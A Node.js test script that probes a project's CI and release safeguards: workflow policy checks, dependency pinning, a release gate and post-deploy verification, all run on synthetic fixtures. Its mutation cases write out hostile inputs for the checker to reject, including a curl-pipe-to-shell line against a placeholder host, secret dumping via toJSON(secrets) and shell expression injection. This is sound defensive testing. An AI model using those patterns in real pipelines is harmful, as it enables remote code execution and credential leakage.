// Probe for the CI and release controls. Synthetic fixtures only: it assembles a package with a fake
// frontend build, runs the real guard through the real gate CLI, and uses a marker script in place of
// wrangler. It never calls a provider, reads an environment file, or builds the real frontend
// (pass --build to also run the real build, which needs a checkout with a real public/ folder).
// Run: node scripts/probe-cicd.mjs
import assert from 'node:assert/strict'
import { createHash } from 'node:crypto'
import { chmodSync, cpSync, existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { dirname, join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { spawnSync } from 'node:child_process'
import { assemble, publicConfig, releaseSettings, wranglerConfig } from './assemble-release-package.mjs'
import { checkRepository, checkWorkflow, parseYaml } from './check-workflows.mjs'
import { guardArgv, parseGateArgs, runGate } from './run-release-gate.mjs'
import { verifyDeployed } from './verify-deployed-build.mjs'

const hash = bytes => createHash('sha256').update(bytes).digest('hex')
const root = realpathSync(join(dirname(fileURLToPath(import.meta.url)), '..'))
const gate = join(root, 'scripts/run-release-gate.mjs')
const clone = value => JSON.parse(JSON.stringify(value))
let checks = 0
const pass = name => { checks++; console.log(`PASS ${name}`) }
const read = path => readFileSync(join(root, path), 'utf8')

// Outside the source tree: the assembler refuses an output inside it, and the guard refuses symlink ancestors.
const fixture = mkdtempSync(join(realpathSync(tmpdir()), 'allworld-cicd-probe-'))
try {
  // ── The YAML subset parser ──
  const sample = parseYaml('name: X\non:\n  push:\n    branches: [main]\nlist:\n  - a: 1\n    b: "two"\n  - plain\ntext: |\n  one\n  two\nflag: false\n')
  assert.deepEqual(sample, { name: 'X', on: { push: { branches: ['main'] } }, list: [{ a: 1, b: 'two' }, 'plain'], text: 'one\ntwo\n', flag: false })
  pass('yaml-subset-parses-known-document')
  for (const [name, text] of [['anchor', 'a: &x 1\n'], ['tab', 'a:\n\tb: 1\n'], ['flow-map', 'a: {b: 1}\n'], ['duplicate-key', 'a: 1\na: 2\n'], ['folded', 'a: >\n  x\n'], ['same-indent-list', 'a:\n- b\n']]) assert.throws(() => parseYaml(text), /YAML line/, name)
  pass('yaml-subset-refuses-unsupported-constructs')

  // ── The real workflows keep every rule ──
  const ci = parseYaml(read('.github/workflows/ci.yml')), release = parseYaml(read('.github/workflows/release.yml'))
  assert.deepEqual(checkWorkflow('ci.yml', ci), []); assert.deepEqual(checkWorkflow('release.yml', release), [])
  assert.deepEqual(Object.keys(ci.on), ['pull_request', 'push']); assert.deepEqual(Object.keys(release.on), ['workflow_dispatch'])
  assert.equal(release.jobs.deploy.environment, 'production'); assert.equal(release.concurrency['cancel-in-progress'], false)
  assert.equal(release.jobs.package.environment, undefined)
  assert.equal(JSON.stringify(ci).includes('secrets'), false, 'ci.yml must not mention secrets')
  const holders = release.jobs.deploy.steps.filter(step => JSON.stringify(step.env ?? {}).includes('secrets.'))
  assert.equal(holders.length, 1); assert.match(holders[0].run, /run-release-gate\.mjs deploy/)
  pass('real-workflows-pass-policy-and-secret-scope')
  assert.deepEqual(checkRepository(root).flatMap(rule => rule.problems), [])
  pass('real-repository-pins-and-private-exclusion')

  // ── Workflow mutations are rejected ──
  const mutate = (source, change) => { const copy = clone(source); change(copy); return copy }
  const deployStep = copy => copy.jobs.deploy.steps.find(step => step.run?.includes('run-release-gate.mjs deploy'))
  const cases = [
    ['pull_request_target', 'ci.yml', ci, c => { c.on = { pull_request_target: { branches: ['main'] } } }, /pull_request_target/],
    ['workflow_run', 'release.yml', release, c => { c.on.workflow_run = { workflows: ['CI'] } }, /workflow_run/],
    ['write-permission', 'ci.yml', ci, c => { c.permissions = { contents: 'write' } }, /read-only/],
    ['missing-permissions', 'ci.yml', ci, c => { delete c.permissions }, /read-only/],
    ['unpinned-action-tag', 'ci.yml', ci, c => { c.jobs.check.steps[0].uses = 'actions/checkout@v4' }, /full commit SHA/],
    ['checkout-keeps-credentials', 'ci.yml', ci, c => { delete c.jobs.check.steps[0].with }, /persist-credentials/],
    ['expression-in-shell', 'ci.yml', ci, c => { c.jobs.check.steps[2].run = 'echo ${{ github.head_ref }}' }, /interpolates/],
    ['secret-in-pull-request-workflow', 'ci.yml', ci, c => { c.jobs.check.steps[3].env = { TOKEN: '${{ secrets.CLOUDFLARE_API_TOKEN }}' } }, /outside the reviewed deploy job/],
    ['secret-in-package-job', 'release.yml', release, c => { c.jobs.package.steps[3].env = { TOKEN: '${{ secrets.CLOUDFLARE_API_TOKEN }}' } }, /outside the reviewed deploy job/],
    ['other-secret-name', 'release.yml', release, c => { deployStep(c).env.OTHER = '${{ secrets.WORLD_FIREBASE_API_KEY }}' }, /WORLD_FIREBASE_API_KEY/],
    ['all-secrets', 'release.yml', release, c => { deployStep(c).env.ALL = '${{ toJSON(secrets) }}' }, /as a whole/],
    ['secret-to-unguarded-step', 'release.yml', release, c => { c.jobs.deploy.steps.at(-1).env.T = '${{ secrets.CLOUDFLARE_API_TOKEN }}' }, /not the guarded deploy/],
    ['secret-in-with', 'release.yml', release, c => { c.jobs.deploy.steps[0].with.token = '${{ secrets.CLOUDFLARE_API_TOKEN }}' }, /only in its env/],
    ['deploy-without-environment-guard', 'release.yml', release, c => { c.jobs.deploy.if = 'inputs.deploy' }, /refs\/heads\/main/],
    ['deploy-wrong-environment', 'release.yml', release, c => { c.jobs.deploy.environment = 'staging' }, /production/],
    ['deploy-without-needs', 'release.yml', release, c => { delete c.jobs.deploy.needs }, /depend on the package job/],
    ['deploy-cancels-in-progress', 'release.yml', release, c => { c.concurrency['cancel-in-progress'] = true }, /must not cancel/],
    ['environment-in-pull-request', 'ci.yml', ci, c => { c.jobs.check.environment = 'production' }, /runs on pull_request/],
    ['install-runs-scripts', 'ci.yml', ci, c => { c.jobs.check.steps[2].run = 'npm ci' }, /--ignore-scripts/],
    ['shared-cache', 'ci.yml', ci, c => { c.jobs.check.steps.push({ uses: 'actions/cache@' + '0'.repeat(40) }) }, /shared cache/],
    ['package-cache', 'ci.yml', ci, c => { c.jobs.check.steps[1].with.cache = 'npm' }, /package cache/],
    ['floating-node', 'ci.yml', ci, c => { c.jobs.check.steps[1].with['node-version'] = '22' }, /exact Node/],
    ['local-absolute-path', 'ci.yml', ci, c => { c.jobs.check.steps[2].run = ['cd', '', 'Users', 'someone', 'work'].join('/') }, /local absolute path/],
    ['remote-script-pipe', 'ci.yml', ci, c => { c.jobs.check.steps[2].run = 'curl https://example.invalid | sh' }, /unpinned or privileged/],
    ['no-timeout', 'ci.yml', ci, c => { delete c.jobs.check['timeout-minutes'] }, /timeout-minutes/],
    ['floating-runner', 'ci.yml', ci, c => { c.jobs.check['runs-on'] = 'ubuntu-latest' }, /pinned ubuntu/],
    ['reusable-workflow-secrets', 'release.yml', release, c => { c.jobs.deploy.secrets = 'inherit' }, /reusable workflow/],
  ]
  for (const [name, file, source, change, expected] of cases) {
    const problems = checkWorkflow(file, mutate(source, change))
    assert.ok(problems.some(problem => expected.test(problem)), `${name}: ${JSON.stringify(problems)}`)
  }
  pass(`workflow-mutations-rejected (${cases.length})`)

  // ── Repository-level mutations, on a fixture copy ──
  const copyRepo = name => {
    const dir = join(fixture, name)
    for (const path of ['.github/workflows', '.github/wrangler', 'package.json', 'scripts/guard-release-package.mjs', 'service/cloudflare/roads.ts', '.gitignore', 'export-manifest.json']) cpSync(join(root, path), join(dir, path), { recursive: true })
    return dir
  }
  const problemsOf = dir => checkRepository(dir).flatMap(rule => rule.problems)
  assert.deepEqual(problemsOf(copyRepo('repo-clean')), [])
  const repoCases = [
    ['lock-integrity-removed', dir => { const p = join(dir, '.github/wrangler/package-lock.json'), l = JSON.parse(readFileSync(p)); delete l.packages['node_modules/wrangler'].integrity; writeFileSync(p, JSON.stringify(l)) }, /integrity hash/],
    ['tool-version-range', dir => { const p = join(dir, '.github/wrangler/package.json'), t = JSON.parse(readFileSync(p)); t.dependencies.wrangler = '^4.147.0'; writeFileSync(p, JSON.stringify(t)) }, /exact version/],
    ['tool-extra-dependency', dir => { const p = join(dir, '.github/wrangler/package.json'), t = JSON.parse(readFileSync(p)); t.dependencies.extra = '1.0.0'; writeFileSync(p, JSON.stringify(t)) }, /exactly one dependency/],
    ['gitignore-drops-handover', dir => { const p = join(dir, '.gitignore'); writeFileSync(p, readFileSync(p, 'utf8').replace('docs/handover/\n', '')) }, /no longer lists docs\/handover/],
    ['manifest-selects-private-file', dir => { const p = join(dir, 'export-manifest.json'), m = JSON.parse(readFileSync(p)); m.files.push({ path: 'docs/handover/NOTES.md' }); writeFileSync(p, JSON.stringify(m)) }, /selects docs\/handover/],
    ['workflow-names-private-path', dir => { const p = join(dir, '.github/workflows/ci.yml'); writeFileSync(p, readFileSync(p, 'utf8') + '      - run: cat .goalmatic/local/world-state.json\n') }, /private path/],
    ['workflow-file-removed', dir => rmSync(join(dir, '.github/workflows/release.yml')), /release\.yml is missing/],
    ['node-pin-drifts', dir => { const p = join(dir, '.github/workflows/ci.yml'); writeFileSync(p, readFileSync(p, 'utf8').replace('22.18.0', '22.19.0')) }, /package\.json minimum/],
    ['road-constants-drift', dir => { const p = join(dir, 'service/cloudflare/roads.ts'); writeFileSync(p, readFileSync(p, 'utf8').replace('23347699', '23347698')) }, /different road data/],
  ]
  for (const [name, change, expected] of repoCases) {
    const dir = copyRepo('repo-' + name); change(dir)
    const problems = problemsOf(dir)
    assert.ok(problems.some(problem => expected.test(problem)), `${name}: ${JSON.stringify(problems)}`)
  }
  pass(`repository-mutations-rejected (${repoCases.length})`)

  // ── Settings and wrangler.json ──
  const real = { ALLWORLD_ORIGIN: 'https://allworld.example', ALLWORLD_AUDIENCE: 'https://legacy.example', ALLWORLD_SITE_ID: 'site-1', ALLWORLD_PACKAGE_ID: 'package-1', ALLWORLD_BUILD_ID: 'allworld-' + 'a'.repeat(40), ALLWORLD_WORKER_NAME: 'allworld', ALLWORLD_CF_ACCOUNT_ID: 'b'.repeat(32), ALLWORLD_FIREBASE_PROJECT_ID: 'allworld-fixture', ALLWORLD_FIREBASE_PROJECT_NUMBER: '123456' }
  const settings = releaseSettings(real)
  assert.deepEqual([settings.maxConnections, settings.importMaxBytes, settings.migrationTag, settings.legacyOrigin], ['4', '65536', 'v1', 'https://legacy.example'])
  for (const [name, change, expected] of [
    ['missing-variable', e => { delete e.ALLWORLD_SITE_ID }, /Missing settings: ALLWORLD_SITE_ID/],
    ['http-origin', e => { e.ALLWORLD_ORIGIN = 'http://allworld.example' }, /exact HTTPS origin/],
    ['origin-with-path', e => { e.ALLWORLD_ORIGIN = 'https://allworld.example/app' }, /exact HTTPS origin/],
    ['legacy-equals-origin', e => { e.ALLWORLD_LEGACY_ORIGIN = e.ALLWORLD_ORIGIN }, /must differ/],
    ['reserved-host', e => { e.ALLWORLD_ORIGIN = 'https://x.invalid' }, /\.invalid/],
    ['bad-account-id', e => { e.ALLWORLD_CF_ACCOUNT_ID = 'short' }, /ALLWORLD_CF_ACCOUNT_ID/],
    ['spaced-build-id', e => { e.ALLWORLD_BUILD_ID = 'two words' }, /ALLWORLD_BUILD_ID/],
    ['zero-connections', e => { e.ALLWORLD_MAX_CONNECTIONS = '0' }, /ALLWORLD_MAX_CONNECTIONS/],
  ]) { const env = { ...real }; change(env); assert.throws(() => releaseSettings(env), expected, name) }
  const guardSource = read('scripts/guard-release-package.mjs')
  const listed = name => [...guardSource.match(new RegExp(`const ${name} = \\[([^\\]]*)\\]`))[1].matchAll(/'([^']+)'/g)].map(m => m[1])
  const config = wranglerConfig(settings, '0'.repeat(64), root)
  assert.deepEqual(Object.keys(config).sort(), listed('CONFIG_KEYS').sort()); assert.deepEqual(Object.keys(config.vars).sort(), listed('VAR_KEYS').sort())
  assert.deepEqual(config.assets.run_worker_first, listed('STATIC')); assert.equal(config.main, join(root, 'service/cloudflare/worker.ts'))
  assert.deepEqual(config.durable_objects.bindings, [{ name: 'WORLD', class_name: 'WorldDurableObject' }]); assert.deepEqual(config.migrations[0].new_sqlite_classes, ['WorldDurableObject'])
  assert.doesNotMatch(JSON.stringify(config), /API_KEY|SESSION_KEY|IMPORT_SECRET|TOKEN/)
  assert.deepEqual(Object.keys(publicConfig(settings)), listed('PUBLIC_KEYS'))
  pass('settings-and-wrangler-config-match-the-guard')

  // ── Assemble with a fake frontend build, then run the real gate CLI ──
  const fakeBuild = (output, configPath) => {
    const published = JSON.parse(readFileSync(configPath, 'utf8')), { origin, ...hosted } = published
    mkdirSync(join(output, 'assets'), { recursive: true })
    const entry = 'if(location.origin!==`' + origin + '`)throw Error();configureHostedWorld({' + Object.entries(hosted).map(([k, v]) => `${k}:\`${v}\``).join(',') + '});'
    const files = { 'app-build.json': '{"id":"0123456789ab","assets":"abcdef012345"}', 'playtest-config.json': JSON.stringify(published, null, 2) + '\n', 'index.html': '<script type="module" src="/assets/index-abcdefgh.js"></script>', 'assets/index-abcdefgh.js': entry }
    const metadata = { schema: 1, config: published, assetRevision: 'abcdef012345', routes: ['/'], files: Object.fromEntries(Object.entries(files).map(([name, content]) => [name, { bytes: Buffer.byteLength(content), sha256: hash(content), immutable: name.startsWith('assets/') }])) }
    metadata.artifactSha256 = hash(JSON.stringify(metadata))
    for (const [name, content] of Object.entries(files)) writeFileSync(join(output, name), content)
    writeFileSync(join(output, 'playtest-build.json'), JSON.stringify(metadata, null, 2) + '\n')
    return { status: 0 }
  }
  const pristine = join(fixture, 'pristine')
  const pins = assemble({ out: pristine, settings, root, build: fakeBuild })
  assert.equal(pins.buildId, real.ALLWORLD_BUILD_ID)
  for (const path of ['wrangler.json', 'public-config.json', 'release-pins.json', 'assets/_headers', 'assets/__world-data/yaba-vehicles.json', 'assets/playtest-build.json']) assert.ok(existsSync(join(pristine, path)), path)
  assert.throws(() => assemble({ out: pristine, settings, root, build: fakeBuild }), /already exists/)
  assert.throws(() => assemble({ out: join(root, 'inside-tree'), settings, root, build: fakeBuild }), /outside the source tree/)
  assert.throws(() => assemble({ out: 'relative/path', settings, root, build: fakeBuild }), /absolute/)
  assert.throws(() => assemble({ out: join(fixture, 'failed'), settings, root, build: () => ({ status: 1 }) }), /build failed/)
  pass('assemble-writes-complete-package-and-refuses-bad-targets')

  const base = { PATH: process.env.PATH, GITHUB_ACTIONS: 'true', GITHUB_EVENT_NAME: 'workflow_dispatch', GITHUB_REF: 'refs/heads/main', CLOUDFLARE_API_TOKEN: 'synthetic-token-not-real', CLOUDFLARE_ACCOUNT_ID: 'b'.repeat(32), UNRELATED_SENTINEL: 'must-not-reach-children' }
  const marker = join(fixture, 'WRANGLER_STARTED'), wrangler = join(fixture, 'fake-wrangler.sh')
  writeFileSync(wrangler, `#!/bin/sh\n{ printf 'argv=%s\\n' "$*"; printf 'cwd=%s\\n' "$PWD"; printf 'token=%s\\n' "$CLOUDFLARE_API_TOKEN"; printf 'metrics=%s\\n' "$WRANGLER_SEND_METRICS"; printf 'sentinel=%s\\n' "$UNRELATED_SENTINEL"; } > "${marker}"\n`, { mode: 0o700 }); chmodSync(wrangler, 0o700)
  const argvFor = (pkg, mode, extra = [], p = pins) => [mode, '--package', pkg, '--build-id', p.buildId, '--artifact-sha', p.artifactSha256, '--config-sha', p.configSha256, '--legacy-origin', p.legacyOrigin, ...(mode === 'deploy' ? ['--wrangler', wrangler] : []), ...extra]
  const cli = (argv, env = base) => spawnSync(process.execPath, [gate, ...argv], { encoding: 'utf8', env })

  // Argument list control, observed through an injected spawn.
  const seen = []
  const spy = (program, args, options) => { seen.push({ program, args, options }); return { status: 0 } }
  assert.equal(runGate(argvFor(pristine, 'check'), base, { root, spawn: spy }), 0)
  assert.deepEqual(seen[0].args, [join(root, 'scripts/guard-release-package.mjs'), 'check', '--package', pristine, '--config', join(pristine, 'wrangler.json'), '--artifact', join(pristine, 'assets'), '--build-id', pins.buildId, '--artifact-sha', pins.artifactSha256, '--config-sha', pins.configSha256, '--road-source', join(root, 'service/cloudflare/roads.ts'), '--legacy-origin', pins.legacyOrigin])
  assert.deepEqual(Object.keys(seen[0].options.env).sort(), ['PATH']); assert.equal(seen[0].options.shell, false)
  assert.equal(runGate(argvFor(pristine, 'deploy'), base, { root, spawn: spy }), 0)
  assert.deepEqual(seen[1].args.slice(-2), ['--deploy-executable', wrangler])
  assert.deepEqual(seen[1].args.slice(1, 2), ['deploy']); assert.equal(seen[1].args.filter(a => a === '--config').length, 1)
  assert.deepEqual(Object.keys(seen[1].options.env).sort(), ['CLOUDFLARE_ACCOUNT_ID', 'CLOUDFLARE_API_TOKEN', 'PATH', 'WRANGLER_SEND_METRICS'])
  assert.equal(guardArgv(parseGateArgs(argvFor(pristine, 'check')), root).includes('--deploy-executable'), false)
  pass('gate-builds-the-exact-guard-argv-and-environment')

  const refusals = [
    ['unknown-flag', argvFor(pristine, 'check', ['--assets', '/elsewhere']), base, 'USAGE'],
    ['repeated-config-override', argvFor(pristine, 'check', ['--config', '/elsewhere']), base, 'USAGE'],
    ['wrangler-in-check', [...argvFor(pristine, 'check'), '--wrangler', wrangler], base, 'USAGE'],
    ['deploy-without-wrangler', argvFor(pristine, 'deploy').slice(0, -2), base, 'USAGE'],
    ['relative-package', argvFor('relative/pkg', 'check'), base, 'PACKAGE_PATH'],
    ['unnormalized-package', argvFor(pristine + '/../pristine', 'check'), base, 'PACKAGE_PATH'],
    ['bad-digest', argvFor(pristine, 'check', [], { ...pins, configSha256: 'xyz' }), base, 'DIGEST'],
    ['bad-build-id', argvFor(pristine, 'check', [], { ...pins, buildId: 'two words' }), base, 'BUILD_ID'],
    ['http-legacy-origin', argvFor(pristine, 'check', [], { ...pins, legacyOrigin: 'http://legacy.example' }), base, 'LEGACY_ORIGIN'],
    ['deploy-from-feature-branch', argvFor(pristine, 'deploy'), { ...base, GITHUB_REF: 'refs/heads/feature' }, 'DEPLOY_CONTEXT'],
    ['deploy-from-pull-request-ref', argvFor(pristine, 'deploy'), { ...base, GITHUB_REF: 'refs/pull/1/merge', GITHUB_EVENT_NAME: 'pull_request' }, 'DEPLOY_CONTEXT'],
    ['deploy-from-push', argvFor(pristine, 'deploy'), { ...base, GITHUB_EVENT_NAME: 'push' }, 'DEPLOY_CONTEXT'],
    ['deploy-outside-actions', argvFor(pristine, 'deploy'), { ...base, GITHUB_ACTIONS: undefined }, 'DEPLOY_CONTEXT'],
    ['deploy-without-token', argvFor(pristine, 'deploy'), { ...base, CLOUDFLARE_API_TOKEN: '' }, 'DEPLOY_CREDENTIALS'],
    ['deploy-bad-account', argvFor(pristine, 'deploy'), { ...base, CLOUDFLARE_ACCOUNT_ID: 'nope' }, 'DEPLOY_CREDENTIALS'],
    ['deploy-synthetic-package', argvFor(pristine, 'deploy', [], { ...pins, legacyOrigin: 'https://legacy.invalid' }), base, 'SYNTHETIC_PACKAGE'],
  ]
  for (const [name, argv, env, expected] of refusals) {
    const run = cli(argv, Object.fromEntries(Object.entries(env).filter(([, v]) => v !== undefined)))
    assert.equal(run.status, 1, name); assert.equal(run.stderr.trim(), 'FAIL ' + expected, name); assert.equal(existsSync(marker), false, name + ' started wrangler')
  }
  pass(`gate-refuses-before-any-execution (${refusals.length})`)

  // The real guard, through the real CLI, on the pristine package.
  const check = cli(argvFor(pristine, 'check'))
  assert.equal(check.status, 0, check.stderr); const verdict = JSON.parse(check.stdout)
  assert.equal(verdict.status, 'PASS'); assert.equal(verdict.buildId, pins.buildId); assert.equal(verdict.artifactSha256, pins.artifactSha256); assert.equal(verdict.configSha256, pins.configSha256)
  assert.equal(existsSync(marker), false)
  pass('real-guard-passes-assembled-package')

  // Package mutations: each must stop before wrangler starts, in deploy mode with a marker executable.
  let n = 0
  const pkgCases = [
    ['missing-road', 'ROAD_MISSING', pkg => rmSync(join(pkg, 'assets/__world-data/yaba-vehicles.json'))],
    ['truncated-road', 'ROAD_SIZE_MISMATCH', pkg => writeFileSync(join(pkg, 'assets/__world-data/yaba-vehicles.json'), '{}\n')],
    ['missing-headers', 'REQUIRED_ASSET_MISSING', pkg => rmSync(join(pkg, 'assets/_headers'))],
    ['changed-headers', 'HEADERS_MISMATCH', pkg => writeFileSync(join(pkg, 'assets/_headers'), '/*\n  X-Test: 1\n')],
    ['missing-build-id-file', 'REQUIRED_ASSET_MISSING', pkg => rmSync(join(pkg, 'assets/app-build.json'))],
    ['missing-entry-asset', 'ASSET_MANIFEST_CLOSURE_MISMATCH', pkg => rmSync(join(pkg, 'assets/assets/index-abcdefgh.js'))],
    ['extra-file', 'ASSET_MANIFEST_CLOSURE_MISMATCH', pkg => writeFileSync(join(pkg, 'assets/assets/extra-abcdefgh.js'), 'x')],
    ['private-path-in-assets', 'ASSET_PATH_INVALID', pkg => { mkdirSync(join(pkg, 'assets/.goalmatic')); writeFileSync(join(pkg, 'assets/.goalmatic/world-state.json'), '{}') }],
    ['unreviewed-top-level-file', 'UNREVIEWED_ASSET_PATH', pkg => writeFileSync(join(pkg, 'assets/notes.txt'), 'x')],
    ['config-edit-without-new-pin', 'CONFIG_DIGEST_MISMATCH', pkg => { const p = join(pkg, 'wrangler.json'), c = JSON.parse(readFileSync(p)); c.name = 'other'; writeFileSync(p, JSON.stringify(c)) }],
    ['routing-bypass-with-new-pin', 'STATIC_PROTECTION_MISMATCH', (pkg, p) => { const f = join(pkg, 'wrangler.json'), c = JSON.parse(readFileSync(f)); c.assets.run_worker_first.push('!/__world-data/*'); writeFileSync(f, JSON.stringify(c)); p.configSha256 = hash(readFileSync(f)) }],
    ['build-hook-with-new-pin', 'CONFIG_SHAPE', (pkg, p) => { const f = join(pkg, 'wrangler.json'), c = JSON.parse(readFileSync(f)); c.build = { command: 'must never run' }; writeFileSync(f, JSON.stringify(c)); p.configSha256 = hash(readFileSync(f)) }],
    ['wrong-build-id', 'BUILD_CONFIG_MISMATCH', (pkg, p) => { p.buildId = 'allworld-' + 'c'.repeat(40) }],
  ]
  for (const [name, expected, change] of pkgCases) {
    const pkg = join(fixture, `pkg-${n++}`); cpSync(pristine, pkg, { recursive: true })
    const p = { ...pins }; change(pkg, p)
    const run = cli(argvFor(pkg, 'deploy', [], p))
    assert.equal(run.status, 1, name + ': ' + run.stdout); assert.equal(run.stderr.trim(), 'FAIL ' + expected, name); assert.equal(existsSync(marker), false, name + ' started wrangler')
  }
  pass(`gate-rejects-incomplete-or-tampered-packages-before-deploy (${pkgCases.length})`)

  // The accepted deploy path: wrangler starts once, in the package, with the token and nothing else.
  const deployed = cli(argvFor(pristine, 'deploy'))
  assert.equal(deployed.status, 0, deployed.stderr)
  const record = Object.fromEntries(readFileSync(marker, 'utf8').trim().split('\n').map(line => [line.slice(0, line.indexOf('=')), line.slice(line.indexOf('=') + 1)]))
  assert.equal(record.argv, `deploy --config ${join(pristine, 'wrangler.json')}`); assert.equal(record.cwd, pristine)
  assert.equal(record.token, 'synthetic-token-not-real'); assert.equal(record.metrics, 'false'); assert.equal(record.sentinel, '')
  assert.doesNotMatch(deployed.stdout + deployed.stderr, /synthetic-token-not-real/)
  pass('accepted-deploy-runs-wrangler-once-with-only-its-token')

  // ── Post-deploy confirmation ──
  const answer = (status, body) => ({ status, json: async () => body })
  const healthy = { ok: true, mode: 'hosted', buildId: pins.buildId, channel: 'test', guests: 'public', claimAvailable: true }
  const calls = []
  const request = (health, road = 404) => async (url, options) => { calls.push({ url, options }); return url.endsWith('/world/health') ? health() : answer(road) }
  const ok = await verifyDeployed({ origin: 'https://allworld.example', buildId: pins.buildId, request: request(() => answer(200, healthy)), attempts: 2, delayMs: 0, wait: async () => {} })
  assert.equal(ok.status, 'PASS'); assert.ok(calls.every(call => call.options.redirect === 'manual')); assert.deepEqual(calls.map(call => call.url), ['https://allworld.example/world/health', 'https://allworld.example/__world-data/yaba-vehicles.json'])
  await assert.rejects(verifyDeployed({ origin: 'https://allworld.example', buildId: pins.buildId, request: request(() => answer(200, { ...healthy, buildId: 'allworld-old' })), attempts: 2, delayMs: 0, wait: async () => {} }), { message: 'BUILD_MISMATCH' })
  await assert.rejects(verifyDeployed({ origin: 'https://allworld.example', buildId: pins.buildId, request: request(() => answer(200, healthy), 200), attempts: 1, delayMs: 0, wait: async () => {} }), { message: 'ROAD_PUBLIC' })
  let tries = 0
  await assert.rejects(verifyDeployed({ origin: 'https://allworld.example', buildId: pins.buildId, request: async () => { tries++; throw new Error('offline') }, attempts: 3, delayMs: 0, wait: async () => {} }), { message: 'HEALTH_UNAVAILABLE' })
  assert.equal(tries, 3)
  await assert.rejects(verifyDeployed({ origin: 'http://allworld.example', buildId: pins.buildId }), { message: 'ORIGIN' })
  await assert.rejects(verifyDeployed({ origin: 'https://allworld.example/', buildId: pins.buildId }), { message: 'ORIGIN' })
  pass('deployed-build-check-controls')

  // ── Optional: the real frontend build, for a checkout that has a real public/ folder ──
  if (process.argv.includes('--build')) {
    const scratch = mkdtempSync(join(realpathSync(tmpdir()), 'allworld-cicd-'))
    try {
      const out = join(scratch, 'package')
      const built = spawnSync(process.execPath, [join(root, 'scripts/assemble-release-package.mjs'), '--out', out, '--synthetic'], { encoding: 'utf8', env: { PATH: process.env.PATH } })
      assert.equal(built.status, 0, built.stderr); const real = JSON.parse(built.stdout.trim().split('\n').at(-1))
      const verdict = cli(argvFor(out, 'check', [], real)); assert.equal(verdict.status, 0, verdict.stderr)
      console.log(`PASS real-frontend-build-passes-package-gate files=${JSON.parse(verdict.stdout).files}`); checks++
    } finally { rmSync(scratch, { recursive: true, force: true }) }
  }
  console.log(`ALL PASS ${checks} checks, providerCalls 0`)
} finally { rmSync(fixture, { recursive: true, force: true }) }
